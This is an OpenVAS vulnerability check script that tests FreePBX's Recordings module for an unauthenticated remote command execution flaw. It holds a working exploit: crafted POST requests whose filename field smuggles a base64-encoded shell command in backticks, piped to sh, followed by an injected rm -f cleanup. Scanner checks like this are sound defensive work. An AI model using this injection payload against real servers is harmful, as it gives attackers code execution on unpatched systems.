###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freepbx_sec_2016_004.nasl 12449 2018-11-21 07:50:18Z cfischer $
#
# FreePBX Remote Command Execution with Privileged Escalation
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:freepbx:freepbx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105874");
  script_version("$Revision: 12449 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("FreePBX Remote Command Execution with Privileged Escalation");
  script_tag(name:"last_modification", value:"$Date: 2018-11-21 08:50:18 +0100 (Wed, 21 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-08-17 16:55:21 +0200 (Wed, 17 Aug 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_freepbx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("freepbx/installed");

  script_xref(name:"URL", value:"https://www.freepbx.org/security-vulnerability-notice-2/");
  script_xref(name:"URL", value:"https://wiki.freepbx.org/display/FOP/2016-08-09+CVE+Remote+Command+Execution+with+Privileged+Escalation");

  script_tag(name:"vuldetect", value:"Send two special crafted HTTP POST requests and check the response.");

  script_tag(name:"insight", value:"The recordings module lets you playback recorded files. Due to a coding error, certain Ajax requests were
  unauthenticated when requesting files. This allowed shell execution and privileged escalation if triggered correctly.");

  script_tag(name:"solution", value:"This has been fixed in Recordings 13.0.27.");

  script_tag(name:"summary", value:"A Remote Command Execution vulnerability that results in Privileged Escalation exists in FreePBX 13 and FreePBX 14 with `Recordings' versions between 13.0.12 and 13.0.26.");

  script_tag(name:"affected", value:"System Recordings Module versions 13.0.1beta1 through 13.0.26.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

host = http_host_name( port:port );

vtstrings = get_vt_strings();

function _run( file )
{
  local_var buf;

  post_data = string('\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="extension"\r\n\r\n',
  '0\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="language"\r\n\r\n',
  'de\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="filename"\r\n\r\n',
  file, '\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="systemrecording"\r\n\r\n\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="id"\r\n\r\n',
  '1\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="name"\r\n\r\n',
  'aaaa\r\n',
  '------------', vtstrings["default"], '\r\n',
  'Content-Disposition: form-data; name="file"; filename="', vtstrings["default"], '"\r\n',
  'Content-Type: audio/mpeg\r\n\r\n',
  vtstrings["default"], ' Test for https://www.exploit-db.com/exploits/40232/\r\n',
  '------------', vtstrings["default"], '--');

  req = http_post_req( port:port,
                       url:' /admin/ajax.php?module=recordings&command=savebrowserrecording ',
                       data:post_data,
                       add_headers:make_array("Content-Type", string( "multipart/form-data; boundary=----------", vtstrings["default"]),
                                              "Referer","http://" + host + "/") );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf !~ "HTTP/1\.. 200" || 'status":true' >!< buf || 'filename"' >!< buf ) return;

  fs = eregmatch( pattern:'_fs-([0-9]+[^.]+).wav', string:buf );
  if( isnull( fs[1] ) ) return;

  rep_file = file + '-' + fs[1]  + '.wav';

  post_data = 'file=' + rep_file + '&name=a&codec=gsm&lang=ru&temporary=1&command=convert&module=recordings';

  req = http_post_req( port:port,
                       url:'/admin/ajax.php',
                       data:post_data,
                       add_headers:make_array("Content-Type","application/x-www-form-urlencoded; charset=UTF-8",
                                              "Referer","http://" + host + "/") );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  return buf;
}


file = '_' + vtstrings["lowercase"] + '_`echo aWQK | base64 -d | sh`_fs';
buf = _run( file:file );

if( ! buf ) exit( 0 );

if( buf =~ "uid=[0-9]+.*gid=[0-9]+" )
{
  del = eregmatch( pattern:"open input file `(\\/[^_]+/)_" + vtstrings["lowercase"] + "_", string:buf );
  if( ! isnull( del[1] ) )
    d = str_replace( string:del[1], find:"\", replace:"");

  if( d && strlen( d ) > 1 && d[0] == "/" )
  {
    file = 'rm -f ' + d + '_' + vtstrings["lowercase"] + '_*_fs-*.wav';
    file = '_' + vtstrings["lowercase"] + '_' + '`echo ' + base64( str:file )  + ' | base64 -d | sh`_fs';
    t = _run( file:file );
  }

  res = buf;
  r = eregmatch( pattern:'(uid=[0-9]+.*gid=[0-9]+[^_]+)', string:buf );
  if( ! isnull( r[1] ) ) res = r[1];

  report = 'It was possible to execute the `id` command on the remote host. Result:\n\n' + res + '\n';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );